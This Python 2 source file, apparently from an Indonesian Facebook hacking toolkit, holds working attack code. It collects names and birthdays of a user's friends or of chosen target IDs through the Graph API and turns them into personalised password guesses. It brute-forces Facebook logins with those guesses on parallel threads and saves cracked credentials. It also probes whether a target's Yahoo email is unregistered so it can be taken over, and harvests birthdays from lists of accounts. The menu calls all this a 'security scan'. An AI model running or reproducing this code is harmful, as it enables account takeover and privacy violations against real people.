#-*-coding:utf-8-*-
import re
import sys
import bs4
import json
import random
import requests
import interpreter
import mechanize
from data import cache
from data.color import *
from data import new_token
from multiprocessing.pool import ThreadPool

bulan={
			"01":"januari","02":"februari",
			"03":"maret","04":"april","05":"mei",
			"06":"juni","07":"juli","08":"agustus",
			"09":"september","10":"oktober",
			"11":"november","12":"desember"}
			
def detect(token):
	if token:
		s=requests.get(
			"https://graph.facebook.com/me?access_token=%s"%(token))
		if "birthday" in s.text:
			ss=s.json()["birthday"].split("/")
			return "%s %s %s"%(ss[1],bulan[ss[0]],ss[2])
		else:
			return "%sno birthday date detected%s"%(R,N)
			
			
def detect2(token,id):
	if token:
		s=requests.get(
			"https://graph.facebook.com/"+id+"?access_token=%s"%(token))
		if "birthday" in s.text:
			ss=s.json()["birthday"].split("/")
			try:
				return "%s %s %s"%(ss[1],bulan[ss[0]],ss[2])
			except:return "%sERROR%s"%(R,N)
		else:
			return "%sno birthday date detected%s"%(R,N)
	
#	else:
#		r=requests.get(
#			"https://graph.facebook.com/%s?access_token=%s"%(
#		id,token))
#		if "birthday" in str(s):
#			return s.json()["birthday"]
#		else:
#			return "private birthday date"
			
class detect_birth:
	def __init__(self):
		print "\t[ Select Actions ]\n"
		print "{%s01%s} Detect Birthday Date By Account List."%(G,N)
		print "{%s02%s} Detect Birthday Date By ID List."%(G,N)
		print "{%s03%s} Back To Menu Options\n"%(R,N)
		self.c()
		
	def c(self):
		self.ch=raw_input("%s[%s*%s]%s Actions>> "%(G,R,G,N))
		if self.ch =="":
			self.c()
		elif self.ch =="1" or self.ch =="01":
			print "* sparator: |"
			self.detect1()
		elif self.ch =="2" or self.ch =="02":
			self.detect2()
		elif self.ch =="3" or self.ch =="03":
			raw_input("press enter to menu...")
			interpreter.ASU()
		else:
			print "%s[!]%s invalid options!"%(R,N)
			self.c()
			
	def detect1(self):
		try:
			self.l=open(raw_input("[?] account list: ")).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.detect1()
		self.ou()
		ThreadPool(5).map(self.login,self.l)
		print "\n[+] OUTPUT: out/"+self.out
		raw_input("[+] finished.\npress enter to menu...")
		interpreter.ASU()
		
	def ou(self):
		try:
			self.out=raw_input("[?] result filename: ")
			open("out/"+self.out,"w").close()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.ou()
		print "[+] OUTPUT: out/"+self.out

		
	def login(self,akun):
		s=new_token.token(akun)
		if type(s) !=bool:
			if "checkpoint" in s:
				print "[%s]: %sCHECKPOINT CHALLANGE%s"%(akun,R,N)
			else:
				y=detect(s)
				iis= "[%s]: %s%s%s"%(akun,G,y,N)
				if "no birthday date detected" in y:
					pass
				else:
					print iis
					open("out/"+self.out,"a+").write("[%s]: %s\n"%(akun,y))
		elif s is False:
			print "[%s]: %sLOGIN FAILED%s"%(akun,R,N)
			
	def detect2(self):
		con=json.loads(open("config/config.json").read())
		self.n=new_token.token("%s|%s"%(con["email"],con["pass"]))
		if type(self.n) !=bool:
			if "checkpoint" in self.n:
				exit("login failed")
			else:
				self.on()
		else:
			exit("login failed.")
			
	def on(self):
		try:
			self.l=open(raw_input("[?] ID list: ")).read().splitlines()
		except Exception as e:
			print "%s[!]%s %s"%(R,N,e)
			self.detect2()
		self.ou()
		ThreadPool(5).map(self.k,self.l)
		print "\n[+] OUTPUT: out/"+self.out
		raw_input("[+] finished.\npress enter to menu...")
		interpreter.ASU()
		
	def k(self,ak):
		y=detect2(self.n,ak)
		iis= "[%s]: %s%s%s"%(ak,G,y,N)
		if "no birthday date detected" in y:
			print iis
		else:
			print iis
			open("out/"+self.out,"a+").write("[%s]: %s\n"%(ak,y))
		

class buddy:
	def __init__(self):
		self.data=[]
		self.found=[]
		self.cp=[]
		self.num=0
		self.foll=0
		self.tokeng=[]
		self.loli=[]
		self.i="https://mbasic.facebook.com/{}"
		self.req=requests.Session()
		config=open("config/config.json").read()
		self.config=json.loads(config)
		self.getLogin()

	def maklo(self,arg,kwds):
		m=mechanize.Browser()
		m.set_handle_equiv(True)
		m.set_handle_redirect(True)
		m.set_handle_robots(False)
		m.addheaders=[
			("User-Agent","Mozilla 5.1 (Linux Android)")]
		m.open("https://login.yahoo.com/config/login")
		m._factory.is_html=True
		m.select_form(nr=0)
		m.form["username"]="%s"%(arg)
		r=m.submit().read()
		F=re.findall(
			"messages\.ERROR_INVALID_USERNAME",r)
		if len(F) !=0:
			print "[ %sVULN YAHOO CLONE%s ] %s => %s"%(G,N,kwds,arg)
			m.close()
		else:
			print "[ %sDIEE%s ] %s => %s"%(R,N,kwds,arg)
			m.close()
			
	def crack(self,pw):
		try:
			s=requests.post(self.i.format("login"),
				data={"email":self.id,"pass":pw})
			if "save-device" in s.url or "m_sess" in s.url:
				print ("\r%s[*] YES: %s                           %s"%(G,pw,N))
				self.found.append("%s|%s"%(self.id,pw))
			if "checkpoint" in s.url or "chal" in s.url:
				self.cp.append("%s|%s"%(self.id,pw))
			if "sering" in s.text.lower():
				print("\r%s[!]%s REQUEST LOGIN WAS BLOCKED: %s    "%(
					R,N,pw))
			else:
				print ("\r[!] no: %s                           "%(pw))
			self.num+=1
		except:
			pass
		print("\r%s[*]%s Cracking %s/%s"%(G,N,self.num,len(self.data))),;sys.stdout.flush()
				
	def back(self):
		raw_input("\npress enter to menu...")
		interpreter.ASU()

	def getLogin(self):
		try:
			self.token=requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email={}&locale=en_US&password={}&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6".format(self.config["email"],self.config["pass"])).json()["access_token"]
		except:
			exit("%s[!]%s failed when generate access token"%(R,N))
		self.menu()
		
	def menu(self):
		print("\n\t[ Select Actions ]\n")
		print("  {%s01%s} FriendLists Scurity Scan."%(G,N))
		print("  {%s02%s} Other ID Scurity Scan."%(G,N))
		print("  {%s03%s} Grab Information Gathering From Account List."%(G,N))
		print("  {%s04%s} Birthday Date Detector"%(G,N))
		print('  {%s05%s} Back To Menu Option.\n'%(R,N))
		self.m()
		
	def m(self):
		pilih=raw_input("%s[%s*%s]%s Actions>> "%(G,R,G,N))
		if pilih =="1" or pilih =="01":
			self.friend_scurity()
		elif pilih =="2" or pilih =="02":
			self.other_scurity()
		elif pilih =="3" or pilih =="03":
			self.infoga()
		elif pilih =="":
			self.m()
		elif pilih =="4" or pilih =="04":
			detect_birth()
		elif pilih =="5" or pilih =="05":
			self.back()
		else:
			print("%s[!]%s invalid options!"%(R,N))
			self.m()
			
	def infoga(self):
		print "[!] module ini sedang dalam perbaikan *_-"
		self.back()
		
		
	def friend_scurity(self):
		self.q=raw_input("%s[?]%s name query: "%(G,N)).lower()
		if self.q =="":
			self.friend_scurity()
		self.gr()
		
	def gr(self):
		self.fl=[]
		for x in requests.get("https://graph.facebook.com/me/friends?access_token=%s"%(self.token)).json()["data"]:
			if self.q in x["name"].lower():
				self.fl.append(x["id"])
				print "%s. %s"%(len(self.fl),x["name"].lower().replace(self.q,"%s%s%s"%(R,self.q,N)))
		if len(self.fl) ==0:
			print("%s[!]%s no result."%(R,N))
			self.gr()
		else:
			print 
			self.choice()
		
	def choice(self):
		try:
			self.c=input("%s[?]%s Select Number: "%(G,N))
		except Exception as e:
			print("%s[!]%s %s"%(R,N,e))
			self.choice()
		self.id=self.fl[self.c-1]
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.fl[self.c-1],self.token)).json(),"first_name")
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.fl[self.c-1],self.token)).json(),"last_name")
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.fl[self.c-1],self.token)).json(),"name")
		self.tgl(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.fl[self.c-1],self.token)).json())
		if len(self.data) !=0:
			print("%s[*]%s Bruteforcing test with %s passwords..."%(
				G,N,len(self.data)))
			ThreadPool(5).map(self.crack,self.data)
			if len(self.found) !=0:
				print("\n[*] Congrats! %s"%(self.found[0]))
				self.back()
			if len(self.cp) !=0:
				print("\n[*] Target Is Cracked But Checkpoint: %s"%(
					self.cp[0]))
				self.back()
			else:
				print("\n[-] No result for bruteforce.")
				print("[!] Testing For Email Cloner...")
				r=requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.fl[self.c-1],self.token)).json()
				try:
					if "yahoo.com" in r["email"]:
						self.maklo(r["email"],r["name"])
						self.back()
					else:
						print("%s[!]%s Unknown email."%(R,N))
						self.back()
				except Exception as e:
					print("%s[!]%s invalid parameter: %s"%(R,N,e))
					print("%s[!]%s Unknown email."%(R,N))
					self.back()
						
	def fo(self,p,date):
		try:
			k=p[date]
			if len(k) >5:
				self.data.append(k.lower())
			self.data.append("%s123"%(k.lower().replace(" ","")))
			self.data.append("%s12345"%(k.lower().replace(" ","")))
			self.data.append("%s321"%(k.lower().replace(" ","")))
			self.data.append("%scantik"%(k.lower().replace(" ","")))
			self.data.append("%sganteng"%(k.lower().replace(" ","")))
			self.data.append("%scakep"%(k.lower().replace(" ","")))
			self.data.append("%smanis"%(k.lower().replace(" ","")))
			self.data.append("%sgammer"%(k.lower().replace(" ","")))
			self.data.append("%sgammers"%(k.lower().replace(" ","")))
			self.data.append("%sgamers"%(k.lower().replace(" ","")))
		except:
			return False
		
		
	def tgl(self,p):
		bulan={
			"01":"januari","02":"februari",
			"03":"maret","04":"april","05":"mei",
			"06":"juni","07":"juli","08":"agustus",
			"09":"september","10":"oktober",
			"11":"november","12":"desember"}
		try:
			s=p["birthday"]
			self.data.append(s.replace("/",""))
			self.data.append("%s%s%s"%(
				bulan[s.split("/")[0]],s.split("/")[1],s.split("/")[2]))
			self.data.append("%s%s%s"%(s.split("/")[1],
				bulan[s.split("/")[0]],s.split("/")[2]))
			self.data.append(
				"%s%s"%(bulan[s.split("/")[0]],s.split("/")[2]))
			self.data.append(
				"%s%s"%(s.split("/")[1],bulan[s.split("/")[0]]))
			self.data.append("%s"%(bulan[s.split("/")[0]]))
			self.data.append("%s123"%(bulan[s.split("/")[0]]))
		except:
			return False
	
	def other_scurity(self):
		self.id=raw_input("%s[?]%s Target ID: "%(G,N))
		if self.id =="":
			self.other_scurity()
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.id,self.token)).json(),"first_name")
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.id,self.token)).json(),"last_name")
		self.fo(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.id,self.token)).json(),"name")
		self.tgl(requests.get("https://graph.facebook.com/%s?access_token=%s"%(self.id,self.token)).json())
		if len(self.data) !=0:
			ThreadPool(5).map(self.crack,self.data)
			if len(self.found) !=0:
				print("\n%s[*]%s Cracked: %s"%(G,N,self.found[0]))
				self.back()
			if len(self.cp) !=0:
				print("\n%s[*]%s Cracked but Checkpoint: %s"%(O,N,self.cp[0]))
			else:
				print("\n%s[!]%s no result:("%(R,N))
				self.back()
		
